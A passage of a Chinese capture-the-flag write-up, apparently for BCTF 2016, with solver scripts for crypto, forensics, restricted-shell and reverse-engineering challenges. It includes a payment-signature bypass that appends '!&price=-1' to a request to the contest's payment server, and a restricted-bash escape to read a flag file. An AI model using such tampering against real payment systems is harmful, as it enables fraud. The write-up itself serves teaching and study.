list2:</p><p>&nbsp; &nbsp; res += str(i % 60)</p><p>for i in xrange(68):</p><p>&nbsp; &nbsp; print res[i * 8:i * 8 + 8][::-1]</p><p>for i in xrange(26):</p><p>&nbsp; &nbsp; s_10 = int(res[i * 8:i * 8 + 8][::-1], 2)</p><p>&nbsp; &nbsp; s_16 = '%x' % (s_10)</p><p>&nbsp; &nbsp; s = binascii.a2b_hex(s_16)</p><p>&nbsp; &nbsp; flag += s</p><p>print flag</p></code></pre>
</p>
<h3>3.	catvideo(150分)</h3>
<p><b>Q:forensic?</b></p>
<p>在网上找了好久的工具，没有一个能用的，没办法，在github上找了很久，找了一个ffmpeg然而没学会怎么用，找了找以前的wreiteup有一个<a href="http://blog.midchildan.org/2015/12/06/seccon-ctf-15/" target="_blank">日本的博客</a>的wp上面有一个关于提取的脚本，拿下来改改，</p>
</p>
<pre><code><p>#!/usr/bin/python</p><p>import cv2</p><p>import numpy</p><p>import qrcode</p><p>cap = cv2.VideoCapture('ts.mp4')</p><p>cap.set(cv2.cv.CV_CAP_PROP_POS_MSEC, 3800)</p><p>while True:</p><p>&nbsp; &nbsp; success, frame = cap.read()</p><p>&nbsp; &nbsp; if success:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>qr_image = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</p><p>while cap.get(cv2.cv.CV_CAP_PROP_POS_MSEC) &lt; 4600:</p><p>&nbsp; &nbsp; success, frame = cap.read()</p><p>&nbsp; &nbsp; if not success:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; continue</p><p>&nbsp; &nbsp; grayframe = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</p><p>&nbsp; &nbsp; cv2.bitwise_or(qr_image, grayframe, qr_image)</p><p>&nbsp; &nbsp; cv2.imshow('qrcode', qr_image)</p><p>&nbsp; &nbsp; if cv2.waitKey(2) &amp; 0xFf == ord('q'):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>cap.release()</p><p>cv2.imwrite('qrcode.png', qr_image)</p><p>cv2.waitKey(0)</p><p>cv2.destroyAllWindows()</p></code></pre>
</p>
<p>之后发现下面出现一行flag，然而很不清楚。。。然后开始慢慢猜单词，首先看出来的是cats，does，not，like，然后最后一个单词是d开头，g结尾。之后通过调整脚本中的3800和4600两个数据，发现在不同时刻，不同单词清楚。于是调整，发现最后一次应该是ing结尾，结合关于猫的事情，猜测是drinking，还被队友鄙视一番。之后就是第一个单词，看出来是cute后面看不清，一直在想什么单词是cute开头的，并没有找到，因为flag说了是0-9A-Za-z]|+，就没想别的，结果在某一个瞬间，发现如果是&amp;符号，那后面就可以是一个单独的单词，然后，。。一切都明朗了，wtf~~~ 。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591422875588.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="64" width="131"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591422875588.png!small" height="64" width="131"></p></noscript>
<h3>4.	Special RSA(200分)</h3>
<p><b>&nbsp;Q:While studying and learning RSA, I knew a new form of encryption/decryption with the same safety as RSA.I encrypted msg.txt and got msg.enc as an example for you.</b></p>
<p>加密函数中c = (pow(k, r, N) * m) % N</p>
<p>其中只有k是未知的</p>
<p>令t=pow(k, r, N)</p>
<p>有c=t*m%N</p>
<p>利用扩展欧几里德可以求得t</p>
<p>而且有两组数据：</p>
<blockquote><p>pow(k, r1, N)=t1</p>
<p>pow(k, r2, N)=t2</p>
</blockquote>
<p>尝试下rsa共模攻击</p>
<p>关键字common modulus attack找到现成的脚本</p>
</p>
<pre><code><p>(e1, n) = (12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443, 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L)</p><p>(e2, n) = (7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059, 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L)</p><p>c1 = 21050269275063947324803736152108894960122834143453871907171889706069292182017441714340845630199726901695235325331162743215493028971840698886694652237493693233562510612601511933544385719792087669184188577257426314936474401349404047895204434845607471209321070641238142431886829644762263880353945176747824295861773784296485143574724157411701384084642412647460092918280364241325796565550082230981630789430160325171428941325164099673663196407439039250584955677662418429817961970120515321431370774024177287738150427369478834235920832376988907441000788444734564377426364934553237120525037142991363604288054944470726414900627</p><p>c2 = 6450984114106657233418272201667817010768003811756575350064243420877391894365353747069532492005631706505537625725185847890305749446294465596475368239792417224814540364037312829242769458491279070913902496186534058889668940647382402026752270529611203130010362248980055145615851893813096026876153582356477939111070601783786491932490927153302914437902634211112496671182359706019466893672546770021703829360700572739573729669067501821556528672020020952478557547749543804975103585024833805220345272127706528601277722403999642507250963456431679257566679612247350741121349306893059826143033437954988365464143578911826517264933</p><p>def gcd(a, b):</p><p>&nbsp; if a == 0:</p><p>&nbsp; &nbsp; x, y = 0, 1;</p><p>&nbsp; &nbsp; return (b, x, y);</p><p>&nbsp; tup = gcd(b % a, a)</p><p>&nbsp; d = tup[0]</p><p>&nbsp; x1 = tup[1]</p><p>&nbsp; y1 = tup[2]</p><p>&nbsp; x = y1 - (b / a) * x1</p><p>&nbsp; y = x1</p><p>&nbsp; return (d, x, y)</p><p>&nbsp;</p><p>#solve the Diophantine equation a*x0 + b*y0 = c</p><p>def find_any_solution(a, b, c):</p><p>&nbsp; tup = gcd(abs(a), abs(b))</p><p>&nbsp; g = tup[0]</p><p>&nbsp; x0 = tup[1]</p><p>&nbsp; y0 = tup[2]</p><p>&nbsp; if c % g != 0:</p><p>&nbsp; &nbsp; return (False, x0, y0)</p><p>&nbsp; x0 *= c / g</p><p>&nbsp; y0 *= c / g</p><p>&nbsp; if a &lt; 0:</p><p>&nbsp; &nbsp; x0 *= -1</p><p>&nbsp; if b &lt; 0:</p><p>&nbsp; &nbsp; y0 *= -1</p><p>&nbsp; return (True, x0, y0)</p><p>&nbsp;</p><p>import sys</p><p>sys.setrecursionlimit(5000) &nbsp;</p><p>&nbsp;</p><p>(x, a1, a2) = find_any_solution(e1, e2, 1)</p><p>if a1 &lt; 0:</p><p>	(x, c1, y) = find_any_solution(c1, n, 1) #get inverse element</p><p>	a1 = -a1</p><p>if a2 &lt; 0:</p><p>	(x, c2, y) = find_any_solution(c2, n, 1)</p><p>	a2 = -a2</p><p>&nbsp;</p><p>m = (pow(c1, a1, n) * pow(c2, a2, n)) % n</p><p>&nbsp;</p><p>print m</p></code></pre>
</p>
<p>得到</p>
<pre><code>k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961</code></pre>
</p>
<p>把key带进原来的脚本解密得到flag</p>
</p>
<pre><code>BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}</code></pre>
</p>
<h3>5.	hsab(250分)</h3>
<p><b>Q:bash？</b></p>
<p>连上nc发现需要爆破下才能登陆，写了个脚本：</p>
</p>
<pre><code><p>#!/usr/env python</p><p>from zio import *</p><p>from hashlib import sha256</p><p>import sys</p><p>from os import urandom</p><p>io = zio(('104.199.132.199', 2222))</p><p>io.read_until('starting with \'')</p><p>t = io.read_until('\'')[:-1]</p><p>while True:</p><p>&nbsp; &nbsp; x = urandom(8).encode('hex')</p><p>&nbsp; &nbsp; if sha256(t + x).hexdigest().startswith('00000'):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; io.write(t + x+'\n')&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>io.interact()</p></code></pre>
</p>
<p>进入后发现是bash的命令行，然后cat，ls这些常见命令都被禁了，尴尬= =</p>
<p>输入help，发现开启的一些命令：</p>
<p style="text-align: center;">
<p>发现有echo，于是就echo *看了下目录，发现flag的目录：</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591423302751.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="219" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591423302751.png!small" height="219" width="554"></p></noscript>
<p>然后就各种读flag：</p>
<p>value=$(&lt;/home/ctf/flag.ray) | echo &#8220;$value&#8221;这种的都不行，&lt;应该也被限制了。和队友讨论了下，队友说你试试bash –v行吗。。。果真老司机= =</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591423483603.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="105" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591423483603.png!small" height="105" width="554"></p></noscript>
<p>得到最后flag。</p>
<h3>6.	zerodaystore(200分)</h3>
<p>给了一个安卓apk和一段server的Python代码，代码见 <a href="https://gist.github.com/virusdefender/9aec40d6ae73ead56429">https://gist.github.com/virusdefender/9aec40d6ae73ead56429</a></p>
<p>安卓大致的逆向了一下，就觉得order和pay的url是有用的，其余没啥问题。问题应该在server上，需要修改price。</p>
<p>可控的位置是`androidID`，一般混淆也就是它的值设置为`123&amp;price=-1`，但是这里会在循环中被实际的price覆盖掉。</p>
<p>后来在想到需要利用Python的base64解码的特点，</p>
</p>
<pre><code><p>```python</p><p>In [4]: import base64</p><p>In [5]: base64.b64encode("xxxxxxxxxx")</p><p>Out[5]: 'eHh4eHh4eHh4eA=='</p><p>In [6]: base64.b64decode("eHh4eHh4eHh4eA==")</p><p>Out[6]: 'xxxxxxxxxx'</p><p>In [7]: base64.b64decode("eHh4eHh4eHh4eA==!")</p><p>Out[7]: 'xxxxxxxxxx'</p><p>In [8]: base64.b64decode("eHh4eHh4eHh4eA==!eHh4eHh4eHh4eA==")</p><p>Out[8]: 'xxxxxxxxxx'</p><p>```</p></code></pre>
</p>
<p>这样把price放在最后面就可以了。</p>
</p>
<pre><code><p>```python</p><p>print requests.post("http://paygate.godric.me/pay", data="orderID=12368911859&amp;price=80000&amp;productID=1&amp;timestamp=1458482306973&amp;signer=RSA&amp;hash=sha256&amp;nonce=733d2f88ea74af8a&amp;sign=TzdQaIa7qT/tTb6UNvzl25irdxiFYOj3hq932Wdozzkazsj1cIpzEhE2mnrUewwnuG2lPGpulqdMTGgMJgsUYWrKxEjpk3EKnWukgASyfap9N9EcsgKw67/2wJ00o1Nxc098jTxurLnW2lBfSXNQySDI+M7o0NzD58nYq/Rjzl3NkYFlF+fTf+ZxejM0J+uZCDDi7BZoFhTpFXrV0OPso6Ltefb+o0ZvI6YcBULHRdOVIhzhhnkY68xTBI2ULAH0OEttDls7PlLZnEYYuT92oSr7Q38W6ilpe1EG27czkVCVbuK3AMvfwaLbQnajuOrNz+JumG7TdFSbkwl8Rfgarw==!&amp;price=-1").content</p><p>```</p></code></pre>
</p>
<p>验证代码取到的sign就是带有`!&amp;price=-1`的，但是base64解码后还和原来的是一样的，而解析price的时候却会读取到最后一个price。</p>
<p>结果是`{&#8220;status&#8221;: 4, &#8220;data&#8221;: &#8220;BCTF{0DayL0veR1chGuy5}&#8221;}`</p>
<h2>Reverse</h2>
<h3>1.	LostFlower(250分)</h3>
<p><b>Q:reverse LostFlower</b></p>
<p>java层分析得出stringFromJNI要返回4才会输出flag，打开so发现用ollvm混淆过了，有大量无效指令，so中有4个check函数比较可疑，动态跟踪下发现只有check1用到了，并且check1要返回1，最后stringFromJNI才会返回4，在my_pow函数下断分析出输入有10位数字，并且每一种数字对应唯一一种输出，所以10位数字对应的输出相加的到v15：</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591424528617.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="40" width="413"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591424528617.png!small" height="40" width="413"></p></noscript>
<p>然后进入sub_1aa4，这个函数对输入做取绝对值操作：</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591424556237.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="54" width="553"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591424556237.png!small" height="54" width="553"></p></noscript>
<p>返回结果要小于0才能check1返回1。取绝对值之后返回负数，只有当输入为最小负数时才成立（0&#215;80000000），用c爆破得到输入：1422445956。</p>
</p>
<pre><code><p>#include&lt;stdio.h&gt;</p><p>#include&lt;string.h&gt;</p><p>int main()</p><p>{</p><p>&nbsp; int arr[] = {0, 1, 0x400 ,0xe6a9 &nbsp;,0x100000 ,0x9502f9 ,0x39aa400 &nbsp;,0x10d63af1 ,0x40000000 ,0xcfd41b91};</p><p>&nbsp; int sum = 0,tmp;</p><p>&nbsp; for(int i=0;i&lt;2147483647;++i)</p><p>&nbsp; {</p><p>&nbsp; 	int z = 10;</p><p>&nbsp; 	int j = i;</p><p>&nbsp; 	sum = 0;</p><p>&nbsp; 	while(j%z!=0)</p><p>&nbsp; 	{</p><p>&nbsp; 		sum += arr[j%z];</p><p>&nbsp; 		j = j/10;</p><p>&nbsp; 	}</p><p>&nbsp; 	if(i + 0x59357062 - sum - 0x59357062 == 0x80000000)</p><p>&nbsp; 	{</p><p>&nbsp; 		printf("find! %d\n", i);</p><p>&nbsp; 		break;</p><p>&nbsp; 	}	</p><p>&nbsp; }</p><p>&nbsp; return 0;</p><p>}</p></code></pre>
</p>
<h3>2.	sid(350分)</h3>
<p>题目分了两个人做：</p>
<p><b>Part 1</b></p>
<p>过了好久才发现是Squirrel语言，于是到处找decompiler，在github上面找到了NutCracker：<a href="https://github.com/darknesswind/NutCracker">https://github.com/darknesswind/NutCracker</a>。</p>
<p>只可惜是v2 32位的，而题目是v3 64位的</p>
<p>于是开始疯狂的改程序。方法是对着squirrel的源代码，找到sqobject然后对着看。</p>
<p><span style="color: rgb(0, 112, 192);">（注：这个代码坑人，只能在英文目录下面编译，因为他自带的moc.exe不识别中文路径）</span></p>
<p>之后反编译出来得到代码。</p>
<p><b>Part 2</b></p>
<p>sif是松鼠脚本编译的</p>
<p>神奇的队友修改了nutcrack，把它反编译了</p>
<p>大概逻辑是</p>
<p>先成成md5(key+filename),前8个字节作为加密后文件的头，可以忽略</p>
<p>后8个字节（准确的说是6个字节）作为一个初始值x，传递给一个序列生成函数</p>
<p><span style="color: rgb(0, 112, 192);">注意，这里是按照小端处理。</span></p>
<p>序列生成函数为：</p>
</p>
<pre><code><p>while (true)</p><p>	{</p><p>		yield x;</p><p>		x = x * 0x5deece66d + 11;</p><p>		x = x &amp; ((1 &lt;&lt; 48) - 1);</p><p>	}</p></code></pre>
</p>
<p>每次取x的高32位（4字节）与明文异或得到密文</p>
<p>png格式的前8个字节是固定的</p>
<p>而由于序列的第一个值为x，所以x的高32位直接暴露了，可以穷举2个字节</p>
</p>
<pre><code><p>f1=bytearray('\x89\x50\x4e\x47\x0d\x0a\x1a\x0a')</p><p>f2=bytearray(open('flag.png','rb').read()[8:16])</p><p>r=''</p><p>for i in range(0,len(f2)):</p><p>&nbsp; &nbsp; r+=chr(f1[i]^f2[i])</p><p>&nbsp; &nbsp; print hex(f1[i]^f2[i])</p><p>org=0xc3e61810000</p><p>for bp in range(0xfffff+1):</p><p>&nbsp;x=org+bp</p><p>&nbsp;t=0x5deece66d</p><p>&nbsp;x = x * t + 11</p><p>&nbsp;x = x &amp; ((1 &lt;&lt; 48 ) - 1)</p><p>&nbsp;</p><p>&nbsp;rk=x</p><p>&nbsp;if rk&gt;&gt;40&amp;0xff==0xfd and rk&gt;&gt;32&amp;0xff==0xc8 and rk&gt;&gt;24&amp;0xff==0x8e and rk&gt;&gt;16&amp;0xff==0x94:</p><p>&nbsp; print 'get:'</p><p>&nbsp; print hex(org+bp)</p></code></pre>
</p>
<p>得到x=0xc3e618181ea</p>
<p>解密脚本</p>
</p>
<pre><code><p>x=0xc3e618181ea</p><p>xl=''</p><p>while len(xl)&lt;2400:</p><p>&nbsp;rk=x</p><p>&nbsp;xl+=chr(rk&gt;&gt;40&amp;0xff)</p><p>&nbsp;xl+=chr(rk&gt;&gt;32&amp;0xff)</p><p>&nbsp;xl+=chr(rk&gt;&gt;24&amp;0xff)</p><p>&nbsp;xl+=chr(rk&gt;&gt;16&amp;0xff)</p><p>&nbsp;t=0x5deece66d</p><p>&nbsp;x = x * t + 11</p><p>&nbsp;x = x &amp; ((1 &lt;&lt; 48 ) - 1)</p><p>&nbsp;</p><p>f=open('f.png','wb')</p><p>f1=bytearray(xl)</p><p>f2=bytearray(open('flag.png','rb').read()[8:])</p><p>r=''</p><p>for i in range(0,len(f2)):</p><p>&nbsp; &nbsp; r+=chr(f1[i]^f2[i])</p><p>f.write(r)</p><p>f.close()</p></code></pre>
</p>
<p>flag.png打开是个二维码</p>
<p>#FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE#</p>
<p>The flag is: BCTF{550_loveca_w1th0ut_UR}</p>
<p>#FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE##FLAGE#</p>
<h3>3.	toooooo many switches(700分)</h3>
<p>Q:-&nbsp; hint: If you get the correct flag, you will see congratulations message.</p>
<p>&nbsp;&nbsp;&nbsp; -&nbsp; hint2: There are many possible input that look like flag, but only 1 of them is the correct flag.</p>
<p>&nbsp;&nbsp;&nbsp; -&nbsp; hint3: This program is made by many switch case code.</p>
<p>&nbsp;&nbsp;&nbsp; -&nbsp; hint4: The hash check function called by many switches is actually using a kind of memory hard key derivation function, and to make life easier, the last param for the check function is 4.</p>
<p>&nbsp;&nbsp;&nbsp; -&nbsp; hint5: The flag format is BCTF{[a-zA-Z0-9_+=&lt;&gt;.?]+}, the charset is bigger than normal flag charset. Thanks to Zzzzzzz for pointing out.</p>
<p></p>
<p>这题真是无语TAT，分析了好久的算法结果发现根本不用分析&#8230;</p>
<p>拿到程序之后，发现是UPX加壳，于是直接upx –d得到原文件。</p>
<p>等了自动分析了好久，发现是动态连接的，ida已经自动识别的main函数</p>
<p>验证逻辑十分简单，关键函数就在0x00400A70处。</p>
<p>虽然题目说是switch-case结构，但是个人更愿意把它理解成一个VM</p>
<p>大概就是先把下一个要执行的位置设定好，然后跳到Dispatcher</p>
<p>Dispatcher装载好下一个字节，并按照之前的设定跳转到相应的位置。</p>
<p>如此往复，即可实现flag的验证。</p>
<p>开始想直接无脑爆破，结果发现除了那个长长的大表，还有6个小表，中间的函数有些还是3-5情况。但是很多flag都能到最后一步，所以跑回去看题目中图片。注意到了时间为14s。</p>
<p>于是随便推出一个flag开始分析。发现在0x799CC0的这里</p>
<p><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591425781072.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="53" width="280"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591425781072.png!small" height="53" width="280"></p></noscript>
<p>竟然要循环0&#215;10000次</p>
<p>在这里也要循环好多次：</p>
<p><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591425867252.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="26" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591425867252.png!small" height="26" width="554"></p></noscript>
<p>发现这两个的循环次数由a5 a6 a7决定</p>
<p>于是编写脚本，提取调用0x799CC0，即调用0&#215;400990的参数：</p>
</p>
<pre><code><p>from idaapi import *</p><p>from idc import *</p><p>def get_string(addr):</p><p>&nbsp; out = ""</p><p>&nbsp; while True:</p><p>&nbsp; &nbsp; if Byte(addr) != 0:</p><p>&nbsp; &nbsp; &nbsp; out += chr(Byte(addr))</p><p>&nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; addr += 1</p><p>&nbsp; return out</p><p>func_ea = 0x400990</p><p>func = get_func(func_ea)</p><p>if not func is None:</p><p>	for xref in CodeRefsTo(func_ea,0):</p><p>		#print "cur: 0x%08X" % (xref)</p><p>		a7 = 0</p><p>		a6 = 0</p><p>		a5 = 0</p><p>		pstr = 0</p><p>		ftype = 0</p><p>		if (Byte(xref - 0x10) == 0x4C and Byte(xref - 0x10 + 1) == 0x89 and Byte(xref - 0x10 + 2) == 0xC6 and Byte(xref - 0x10 + 3) == 0x41 and Byte(xref - 0x10 + 4) == 0x89 and Byte(xref - 0x10 + 5) == 0xC0 &nbsp;and Byte(xref - 0x10 + 6) == 0x41 and Byte(xref - 0x10 + 7) == 0x89 and Byte(xref - 0x10 + 8) == 0xC1):</p><p>			if (Byte(xref - 7) == 0xc7 and Byte(xref - 6) == 0x04 and Byte(xref - 5) == 0x24):</p><p>				a7 = Dword(xref - 4)</p><p>			if Byte(xref - 0x28) == 0xb8:</p><p>				a6 = Dword(xref - 0x28 + 1)</p><p>				a5 = a6</p><p>			if (Byte(xref - 0x39) == 0x48 and Byte(xref - 0x39 + 1) == 0xBA):</p><p>				pstr = Qword(xref - 0x39 + 2)</p><p>			ftype = 1</p><p>		elif (Byte(xref - 13) == 0xc7 and Byte(xref - 12) == 0x04 and Byte(xref - 11) == 0x24):</p><p>			a7 = Dword(xref - 10)</p><p>			if Byte(xref - 0x20) == 0x41 and Byte(xref - 0x20 + 1) == 0xB9:</p><p>				a6 = Dword(xref - 0x20 + 2)</p><p>			if Byte(xref - 0x37) == 0x48 and Byte(xref - 0x37 + 1) == 0xBA:</p><p>				pstr = Dword(xref - 0x37 + 2)</p><p>			if Byte(xref - 0x26) == 0x41 and Byte(xref - 0x26 + 1) == 0xb8:</p><p>				a5 = Dword(xref - 0x26 + 2)</p><p>			ftype = 2</p><p>		elif ((Byte(xref - 7) == 0xc7 and Byte(xref - 7 + 1) == 0x04 and Byte(xref - 7 + 2) == 0x24)):</p><p>			a7 = Dword(xref - 7 + 3)</p><p>			if Byte(xref - 0x15) == 0x41 and Byte(xref - 0x15 + 1) == 0xB9:</p><p>				a6 = Dword(xref - 0x15 + 2)</p><p>			if Byte(xref - 0x2c) == 0x48 and Byte(xref - 0x2c + 1) == 0xBA:</p><p>				pstr = Qword(xref - 0x2c + 2)</p><p>			if Byte(xref - 0x1b) == 0x41 and Byte(xref - 0x1b + 1) == 0xb8:</p><p>				a5 = Dword(xref - 0x1b + 2)</p><p>			ftype = 3</p><p>		print "cur: 0x%08X type: %d a5=%4d,a6=%4d,a7=%4d,result=0x%08x,str=0x%08X(%s)" % (xref,ftype,a5,a6,a7,(((1 &lt;&lt; a7) * (1 &lt;&lt; a6 &lt;&lt; 7) + 63) &gt;&gt; 6) &amp; 0xffffffff,pstr,GetString(pstr,-1,ASCSTR_C))</p></code></pre>
</p>
<p>得到形如这样的结果：</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591426332806.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="79" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591426332806.png!small" height="79" width="554"></p></noscript>
<p>导入到excel中，排序得到符合hint要求的情况（a7 == 4）</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591426393920.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="122" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591426393920.png!small" height="122" width="554"></p></noscript>
<p>之后发现从最后的验证处倒退，对应结果是唯一的</p>
<p>于是写脚本：</p>
</p>
<pre><code><p>#-*- coding: utf-8 -*- &nbsp;</p><p>#coding=utf-8</p><p>from idaapi import *</p><p>from idc import *</p><p>import struct</p><p>start_find_ea = 0x00400B0F</p><p>end_find_ea = 0x00799558</p><p>def get_flag(start_ea,last_time_str):</p><p>	cur_func = get_func(start_ea).startEA</p><p>	ea = 0</p><p>	next_func = 0</p><p>	#获取switch-case表中的偏移</p><p>	xref = DataRefsTo(cur_func)</p><p>	xref_num = 0</p><p>	for ea in xref:</p><p>		xref_num = xref_num + 1</p><p>	if(ea == 0 or xref_num &gt; 1):</p><p>		print "Error! Can't find data xref or more than one xref"</p><p>		return last_time_str</p><p>	#print "cur data xref:",hex(ea)</p><p>	if(ea &lt; 0x814748):#不处于小表中</p><p>		#搜索调用偏移的位置</p><p>		calling_offest = (ea - get_name_ea(BADADDR,"Switches")) / 8</p><p>		find_str = "C7 45 DC "+ ' '.join(map(lambda x:x.encode('hex'),list(struct.pack("&lt;I",calling_offest))))</p><p>		next_func = find_binary(start_find_ea,end_find_ea,find_str,16,SEARCH_CASE)</p><p>		if(next_func == BADADDR):</p><p>			print "ended or error finding next func"</p><p>			return last_time_str</p><p>		#next_func = get_func(next_func).startEA</p><p>		#找到判断位置</p><p>		#print "Nextfunc:",hex(next_func)</p><p>		xref = CodeRefsTo(next_func,0)</p><p>		ea = 0</p><p>		xref_num = 0</p><p>		for ea in xref:</p><p>			xref_num = xref_num + 1</p><p>		if(ea == 0 or xref_num &gt; 1):#不是代码引用</p><p>			#print "Error! Can't find code xref or more than one xref"</p><p>			#return last_time_str</p><p>			xref = DataRefsTo(next_func)</p><p>			ea = 0</p><p>			xref_num = 0</p><p>			for ea in xref:</p><p>				xref_num = xref_num + 1</p><p>			if(ea == 0 or xref_num &gt; 1):#不是数据引用</p><p>				print "Error! Can't find code or data xref"</p><p>				return last_time_str</p><p>			#return get_flag(next_func,last_time_str)#处理数据引用</p><p>			smalltable1_start = 0x814748</p><p>			smalltable1_end = 0x8149C8</p><p>			smalltable2_start = 0x8149C8</p><p>			smalltable2_end = 0x0000000000814C48</p><p>			smalltable3_start = 0x0000000000814C48</p><p>			smalltable3_end = 0x0000000000814EE8</p><p>			smalltable4_start = 0x0000000000814EE8</p><p>			smalltable4_end = 0x0000000000815190</p><p>			smalltable5_start = 0x0000000000815190</p><p>			smalltable5_end = 0x0000000000815410</p><p>			smalltable6_start = 0x0000000000815410</p><p>			smalltable6_end = 0x0000000000815448</p><p>			#print "Smalltable address:",hex(ea)</p><p>			if(ea &gt;= smalltable1_start and ea &lt; smalltable1_end):</p><p>				cur_char = (ea - smalltable1_start)/8 + 0x2B</p><p>				next_func = 0x000000000068C0B7</p><p>			elif(ea &gt;= smalltable2_start and ea &lt; smalltable2_end):</p><p>				cur_char = (ea - smalltable2_start)/8 + 0x2B</p><p>				next_func = 0x0000000000685D02</p><p>			elif(ea &gt;= smalltable3_start and ea &lt; smalltable3_end):</p><p>				cur_char = (ea - smalltable3_start)/8 + 0x30</p><p>				next_func = 0x0000000000646DD1</p><p>			elif(ea &gt;= smalltable4_start and ea &lt; smalltable4_end):</p><p>				cur_char = (ea - smalltable4_start)/8 + 0x2B</p><p>				next_func = 0x00000000005B528A</p><p>			elif(ea &gt;= smalltable5_start and ea &lt; smalltable5_end):</p><p>				cur_char = (ea - smalltable5_start)/8 + 0x2B</p><p>				next_func = 0x000000000048D909</p><p>			elif(ea &gt;= smalltable6_start and ea &lt; smalltable6_end):</p><p>				cur_char = (ea - smalltable6_start)/8 + 0x50</p><p>				next_func = 0x0000000000485A2D</p><p>			last_time_str = chr(cur_char) + last_time_str</p><p>			#print last_time_str</p><p>			#print</p><p>			return get_flag(next_func,last_time_str)</p><p>		#处理代码引用</p><p>		#print "Check position:",hex(ea)</p><p>		#获取对应char</p><p>		cur_char = 0</p><p>		if(Byte(ea) == 0xEB and Byte(ea+1) == 0x00 and Byte(ea-0xB) == 0x83 and Byte(ea - 0xB + 1) == 0xE8):</p><p>			cur_char = Byte(ea - 0xB + 2)</p><p>		elif(Byte(ea) == 0xEB and Byte(ea+1) == 0x00 and Byte(ea-8) == 0x83 and Byte(ea - 8 + 1) == 0xE8):</p><p>			cur_char = Byte(ea - 8 + 2)</p><p>		elif(Byte(ea-0xF) == 0x83 and Byte(ea - 0xF + 1) == 0xE9):</p><p>			cur_char = Byte(ea - 0xF + 2)</p><p>		#elif("""Byte(ea) == 0x74 and """Byte(ea-0x9) == 0x83 and Byte(ea-0x9+1) == 0xe8):</p><p>		elif(Byte(ea-0x9) == 0x83 and Byte(ea-0x9+1) == 0xe8):</p><p>			cur_char = Byte(ea - 0x9+2)</p><p>		else:</p><p>			print "Error! Can't find cur_char"</p><p>			return last_time_str</p><p>	else:#处于小表中</p><p>		smalltable1_start = 0x814748</p><p>		smalltable1_end = 0x8149C8</p><p>		smalltable2_start = 0x8149C8</p><p>		smalltable2_end = 0x0000000000814C48</p><p>		smalltable3_start = 0x0000000000814C48</p><p>		smalltable3_end = 0x0000000000814EE8</p><p>		smalltable4_start = 0x0000000000814EE8</p><p>		smalltable4_end = 0x0000000000815190</p><p>		smalltable5_start = 0x0000000000815190</p><p>		smalltable5_end = 0x0000000000815410</p><p>		smalltable6_start = 